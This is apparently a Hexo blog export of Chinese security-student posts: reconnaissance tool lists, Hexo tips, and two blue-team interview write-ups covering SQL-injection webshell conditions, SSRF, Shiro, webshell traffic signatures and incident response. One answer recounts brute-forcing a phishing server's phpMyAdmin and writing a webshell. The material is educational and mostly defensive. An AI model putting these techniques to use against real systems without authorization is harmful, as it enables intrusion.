<h2 id="子域名信息收集"><a href="#子域名信息收集" class="headerlink" title="子域名信息收集"></a>子域名信息收集</h2><h3 id="子域名收集工具"><a href="#子域名收集工具" class="headerlink" title="子域名收集工具"></a>子域名收集工具</h3><ol>
<li>layer子域名挖掘机</li>
<li>subDomainsBrute</li>
<li>Maltego CE</li>
<li>dnsenum</li>
</ol>
<br>

<h2 id="旁站-C段"><a href="#旁站-C段" class="headerlink" title="旁站/C段"></a>旁站/C段</h2><ul>
<li>旁站查询：<a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></li>
<li>在线工具：<a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></li>
<li>在线工具：<a href="https://www.webscan.cc/">https://www.webscan.cc/</a></li>
<li>CDN检测：<a href="https://www.17ce.com/">https://www.17ce.com/</a></li>
</ul>
<h2 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h2><ul>
<li><p>在线指纹识别：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
</li>
<li><p>潮汐指纹：<a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></p>
</li>
</ul>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><ul>
<li>御剑</li>
<li>dirsearch</li>
<li>DirBuster</li>
</ul>
<br>

<h2 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><ul>
<li>nmap</li>
<li>masscan</li>
<li>使用在线网站探测 <a href="http://tool.chinaz.com/port/">http://tool.chinaz.com/port/</a></li>
</ul>
<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ul>
<li>关闭不必要的端口</li>
<li>对重要业务的服务端口设置防火墙</li>
<li>经常性更改用户密码</li>
</ul>
<br>

<h2 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h2><ul>
<li>fofa: <a href="https://fofa.so/">https://fofa.so/</a></li>
<li>钟馗之眼：<a href="http://www.zoomeye.org/">http://www.zoomeye.org</a></li>
<li>Shodan：<a href="https://www.shodan.io/">https://www.shodan.io</a></li>
</ul>
<h2 id="GitHub敏感信息泄漏"><a href="#GitHub敏感信息泄漏" class="headerlink" title="GitHub敏感信息泄漏"></a>GitHub敏感信息泄漏</h2><p><a href="https://www.cnblogs.com/ichunqiu/p/10149471.html">https://www.cnblogs.com/ichunqiu/p/10149471.html</a></p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo基本使用</title>
    <url>/posts/d4fee3ae/</url>
    <content><![CDATA[<p><code>hexo g </code> == <code>hexo generate </code> #生产静态网页<br><code>hexo s </code> == <code>hexo server</code> #启动服务预览<br><code>hexo d</code> == <code>hexo deploy</code> #部署<br><code>hexo clean</code> #清除缓存</p>
<h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><p><code>hexo new post “标题”</code>  新建一篇文章  然后会在_post目录下找到新增的.md文件，用此文件来存方所习得内容编写完markdown文件后，根目录下输入<code> hexo g</code>生产静态页面。输入<code>hexo s</code>本地预览效果，<code>hexo d</code>上传至GitHub</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo文章模板设置</title>
    <url>/posts/2b14b1c3/</url>
    <content><![CDATA[<p>打开hexo项目文件夹张的scaffold中的<code>post.md</code>和<code>draft.md</code>,并修改<br>对应的是 <code>hexo new &lt;title&gt;</code> 默认是<code>post</code>，草稿是<code>draft</code></p>
<blockquote>
<hr>
<p>title: hexo文章模板设置<br>tags:<br>categories:<br>description:<br>date: 1616291706000</p>
<hr>
</blockquote>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>使用proxychains4gitclone拒绝访问</title>
    <url>/posts/3a6e39d4/</url>
    <content><![CDATA[<p>问题:Ubuntu使用proxychain4 git clone 报错 192.168.3.11 1080 拒绝访问<br>原因: 端口被占用了，之前在虚拟机Ubuntu的代理地方设置了代理，再用使用proxychain4，把在虚拟机中的代理设置取消掉就可以了</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装pip2</title>
    <url>/posts/6b338ac1/</url>
    <content><![CDATA[<p><code>kali 安装pip2</code><br><code>wget https://bootstrap.pypa.io/pip/2.6/get-pip.py</code><br><code>sudo python2 get-pip.py</code><br><code>pip2 -V</code><br>升级版本<br><code>sudo pip2 install --upgrade pip</code></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次hw面试经历(2)</title>
    <url>/posts/e9000575/</url>
    <content><![CDATA[<h3 id="现在是不是上大学，4月份是否有时间，"><a href="#现在是不是上大学，4月份是否有时间，" class="headerlink" title="现在是不是上大学，4月份是否有时间，"></a>现在是不是上大学，4月份是否有时间，</h3><p>答: 现在大三在读，4月份有时间可以出来</p>
<h3 id="介绍下简历里的经历"><a href="#介绍下简历里的经历" class="headerlink" title="介绍下简历里的经历"></a>介绍下简历里的经历</h3><p>答: 钓鱼的服务器之前在qq群里看到过，进行信息搜集扫到phpmyadmin 然后爆破<span id="more"></span>之后开启写入日志的设置 写入webshell<br>然后就说了下那次图书馆的一次不完整的溯源经历，时间有些久了记得不是很清楚，而且那时候第一次接触这个，主要有两个现象，一是正常登陆时会被注销，二是mysql无法正常启动。<br>由于系统是window2008 且使用的phpstudy自行搭建的 之前有过被入侵的记录，也存在着一些被非法添加的账号，然后就在注册表中删除了一系列的账户，<br>在msconfig中开启了mysql服务，但是还是无法正常登陆。<br>netstat -ano看了下开启的端口，发现开启了80 Apache 808 iis 135端口。<br>查看事件查看器去看一些异常<br>id<br>4624 账号登陆成功<br>4625 账号登陆失败<br>4720 创建账号<br>4726 删除账号</p>
<h3 id="有没有过相关的护网经验"><a href="#有没有过相关的护网经验" class="headerlink" title="有没有过相关的护网经验"></a>有没有过相关的护网经验</h3><p>答: 没有过hw经验，但是我会去学习去了解</p>
<h3 id="是否有使用过安全产品"><a href="#是否有使用过安全产品" class="headerlink" title="是否有使用过安全产品"></a>是否有使用过安全产品</h3><p>答: 只接触过D盾，别的设备没接触过</p>
<h3 id="说一下常见的端口和漏洞"><a href="#说一下常见的端口和漏洞" class="headerlink" title="说一下常见的端口和漏洞"></a>说一下常见的端口和漏洞</h3><p>答:<br>1433 mssql<br>1521 orcale<br>3306 mysql<br>4376 Redis未授权访<br>7001 weblogic 反序列化<br>445 永恒之蓝</p>
<h3 id="说一下常用的安全工具的流量特征"><a href="#说一下常用的安全工具的流量特征" class="headerlink" title="说一下常用的安全工具的流量特征"></a>说一下常用的安全工具的流量特征</h3><p>答:<br>awvs的在header url body 三项中都会有a%#-wvs<br>sqlmap的 会在ua显示sqlmap级版本号 和 sqlmap网址<br>appscan url header和bkdy中都会有appscan<br>然后说了下菜刀大多使用base64编码，eval和assert会被隔开</p>
<h3 id="说一下冰蝎的流量特征"><a href="#说一下冰蝎的流量特征" class="headerlink" title="说一下冰蝎的流量特征"></a>说一下冰蝎的流量特征</h3><p>答: 这个有点不记得了<br>注:(冰蝎<br>1.content-type一定为application/octet-stream<br>2.内置17个UA Mozilla4/5<br>3.payload定长且无随机填充部分(padding)<br>)</p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo阅读全文设置</title>
    <url>/posts/5605128/</url>
    <content><![CDATA[<p>使用<code>&lt; !--more--&gt;</code>标签手动截断 或者<br>文件夹下的scaffolds文件夹中的post.md中添加一行<code>description:&quot; &quot;</code> 即可在输入<code>hexo new post </code>博客标题命令新建.md文件时自动加上<code>description:&#39; &#39;</code> 在页面上显示阅读全文按钮且不带摘要。</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次hw面试经历(1)</title>
    <url>/posts/40769f33/</url>
    <content><![CDATA[<h1 id="一面"><a href="#一面" class="headerlink" title="一面:"></a>一面:</h1><h3 id="如何接触网络安全的"><a href="#如何接触网络安全的" class="headerlink" title="如何接触网络安全的"></a>如何接触网络安全的</h3><p>答：在大一时开始接触CTF，那时候开始正式接触安全，然后后面主要是学习的web安全，经常会看先知社区，freebuf，csdn和乌云<span id="more"></span>之类的社区文章学习</p>
<h3 id="有无接触过安全设备"><a href="#有无接触过安全设备" class="headerlink" title="有无接触过安全设备"></a>有无接触过安全设备</h3><p>答：没接触过。</p>
<h3 id="是否熟悉windows或者linux命令的使用"><a href="#是否熟悉windows或者linux命令的使用" class="headerlink" title="是否熟悉windows或者linux命令的使用"></a>是否熟悉windows或者linux命令的使用</h3><p>答：之前有学习过Linux，对于Linux和Windows的基本命令操作<!--more-->都可以熟悉使用。&lt; !–more–&gt;</p>
<h3 id="说一下如何进行信息收集"><a href="#说一下如何进行信息收集" class="headerlink" title="说一下如何进行信息收集"></a>说一下如何进行信息收集</h3><p>答：略</p>
<h3 id="sql注入写shell的条件"><a href="#sql注入写shell的条件" class="headerlink" title="sql注入写shell的条件"></a>sql注入写shell的条件</h3><p>答：<br>1.拥有root权限<br>2.知道网站绝对路径<br>3.开启PHP的全局gpc<br>4 在写入的目录下有写入权限</p>
<h3 id="xss的防御"><a href="#xss的防御" class="headerlink" title="xss的防御"></a>xss的防御</h3><p>答：1.进行实体编码<br>       2.对特殊字符进行过滤</p>
<h3 id="说一下ssrf的原理及利用"><a href="#说一下ssrf的原理及利用" class="headerlink" title="说一下ssrf的原理及利用"></a>说一下ssrf的原理及利用</h3><p>答：ssrf是一个攻击者构造形成从服务器端发起的安全漏洞，一般在服务器获取图片，文本之类的地方看到有引用其他文件的地方可以尝试一下是否有ssrf存在<br>利用：<br>1.可以用来对内网端口扫描<br>2.进行文件读取</p>
<h3 id="有没有接触过shiro漏洞"><a href="#有没有接触过shiro漏洞" class="headerlink" title="有没有接触过shiro漏洞"></a>有没有接触过shiro漏洞</h3><p>答：记着以前复现过shiro的反序列化，主要是在rememberme处，其解析为rememberme的cookie值– base64–aes解密–反序列化</p>
<h3 id="有没有溯源的经历"><a href="#有没有溯源的经历" class="headerlink" title="有没有溯源的经历"></a>有没有溯源的经历</h3><p>答：之前学校图书馆有过一次被入侵的经历，当时去看了一下，由于第一次接触就学了下相关内容</p>
<h3 id="说一下应急响应的基本流程"><a href="#说一下应急响应的基本流程" class="headerlink" title="说一下应急响应的基本流程"></a>说一下应急响应的基本流程</h3><p>答：对于Windows端的后门排除</p>
<h4 id="可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等"><a href="#可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等" class="headerlink" title="可以使用一些安全工具：d盾，logparser，autoruns，process explorer等"></a>可以使用一些安全工具：d盾，logparser，autoruns，process explorer等</h4><h4 id="项目检查"><a href="#项目检查" class="headerlink" title="项目检查"></a>项目检查</h4><p>注册表启动项<br>网络连接<br>恶意进程<br>系统服务<br>计划任务</p>
<h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>可以使用logparser格式化后进行分析<br>也可以使用Windows的事件查看器进行分析</p>
<h4 id="检查是否存在shift粘滞键后门"><a href="#检查是否存在shift粘滞键后门" class="headerlink" title="检查是否存在shift粘滞键后门"></a>检查是否存在shift粘滞键后门</h4><p>对于Linux端<br>1.查看异常账号        cat /etc/passwd<br>2.查看进程              ps -ef 丨more<br>3.查看网络连接       netstat -anplt<br>4.计划任务<br>5.系统启动项<br>6.系统日志</p>
<h4 id="对于web服务器"><a href="#对于web服务器" class="headerlink" title="对于web服务器"></a>对于web服务器</h4><p>可以查看中间件配置和相关日志<br>当然也要考虑浏览器劫持问题<br>f12查看网络的加载</p>
<h3 id="有没有面试过其他公司的hw"><a href="#有没有面试过其他公司的hw" class="headerlink" title="有没有面试过其他公司的hw"></a>有没有面试过其他公司的hw</h3><p>答：没有</p>
<h3 id="期望的薪资是多少"><a href="#期望的薪资是多少" class="headerlink" title="期望的薪资是多少"></a>期望的薪资是多少</h3><p><em>面试难度：易<br>面试结果：通过</em></p>
<h1 id="二面"><a href="#二面" class="headerlink" title="二面:"></a>二面:</h1><h3 id="你好，我们是xxx，请问你是xxx吗，现在方便吗？"><a href="#你好，我们是xxx，请问你是xxx吗，现在方便吗？" class="headerlink" title="你好，我们是xxx，请问你是xxx吗，现在方便吗？"></a>你好，我们是xxx，请问你是xxx吗，现在方便吗？</h3><p>答：您好，是的，现在方便，您讲。</p>
<h3 id="你先说一下什么是护网，护网的背景"><a href="#你先说一下什么是护网，护网的背景" class="headerlink" title="你先说一下什么是护网，护网的背景"></a>你先说一下什么是护网，护网的背景</h3><p>答：略</p>
<h3 id="说一下hw防守方流程"><a href="#说一下hw防守方流程" class="headerlink" title="说一下hw防守方流程"></a>说一下hw防守方流程</h3><p>答：前期需要对资产进行梳理，排查暴露面和敏感信息，中期要7*24h值守，及时写日报和周报，后期就需要总结和整改</p>
<h3 id="你说一下struct2-特征"><a href="#你说一下struct2-特征" class="headerlink" title="你说一下struct2 特征"></a>你说一下struct2 特征</h3><p>答：没怎么了解过，只知道有rce漏洞（.action .do）</p>
<h3 id="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"><a href="#看你简历上有过图书馆溯源经历，你简单说一下溯源经历" class="headerlink" title="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"></a>看你简历上有过图书馆溯源经历，你简单说一下溯源经历</h3><p>答：去年我们学校图书馆又被入侵过，老师让我们过去看一下，因为当时是第一次接触，就学习一下</p>
<h3 id="使用事件查看器查看一下是否存在异常事件"><a href="#使用事件查看器查看一下是否存在异常事件" class="headerlink" title="使用事件查看器查看一下是否存在异常事件"></a>使用事件查看器查看一下是否存在异常事件</h3><h3 id="那你说一下异常事件有哪些？"><a href="#那你说一下异常事件有哪些？" class="headerlink" title="那你说一下异常事件有哪些？"></a>那你说一下异常事件有哪些？</h3><p>答：这个不是很了解</p>
<h3 id="那你继续说"><a href="#那你继续说" class="headerlink" title="那你继续说"></a>那你继续说</h3><p>答：可以查看一下开放的端口，并关闭一些不必要的</p>
<h3 id="那你用什么查看呢"><a href="#那你用什么查看呢" class="headerlink" title="那你用什么查看呢"></a>那你用什么查看呢</h3><p>答：netstat -anlpt</p>
<h3 id="那你都关闭了那些端口呢"><a href="#那你都关闭了那些端口呢" class="headerlink" title="那你都关闭了那些端口呢"></a>那你都关闭了那些端口呢</h3><p>答：这个好像不太记得了，好像关闭了3389之类的，还关闭了一个数据库的应该是，记不清楚了，因为这个图书馆管理系统是老师自己用phpstudy搭建的。当时还查看了一下系统账号发现有几个被人添加过的账号，也存在隐藏用户</p>
<h3 id="那你说一下是怎么发现隐藏账户的呢"><a href="#那你说一下是怎么发现隐藏账户的呢" class="headerlink" title="那你说一下是怎么发现隐藏账户的呢"></a>那你说一下是怎么发现隐藏账户的呢</h3><p>答：我记着在注册表的“sam”（当时记不起来具体叫什么了）然后去找是否存在隐藏账号</p>
<h3 id="那隐藏账户有什么特征呢？"><a href="#那隐藏账户有什么特征呢？" class="headerlink" title="那隐藏账户有什么特征呢？"></a>那隐藏账户有什么特征呢？</h3><p>答：隐藏账户都会有~（当时忘记了是$，然后hr也有点疑问，但就是没想起来，隐藏用户用$符，当时回答时错说成了~隐藏用户<br>查看注册表 sam下 domains account users查看users表项中与names表项中项数量是否一致如果一致就没有隐藏用户如果不一致，就对照其他电脑用户注册表，即可找出其他隐藏用户事件查看器，查看异常事件）</p>
<h3 id="那你是怎么去查看日志的呢？"><a href="#那你是怎么去查看日志的呢？" class="headerlink" title="那你是怎么去查看日志的呢？"></a>那你是怎么去查看日志的呢？</h3><p>答：那个系统是好像一个window2008，使用的是Apache，一般Apache的日志好像是httpd</p>
<h3 id="是httpd吗？"><a href="#是httpd吗？" class="headerlink" title="是httpd吗？"></a>是httpd吗？</h3><p>答：这个我有些忘记了，不好意思（当时没想出来，logs/access.log和log/error.log）</p>
<h3 id="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"><a href="#hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。" class="headerlink" title="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"></a>hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。</h3><p>答：好的，麻烦您了，再见~</p>
<p><em>面试来的挺突然的，当时刚要去出去吃晚饭，总共聊了10分钟，感觉回答的不是很好，最后凉了😭</em></p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
</search>
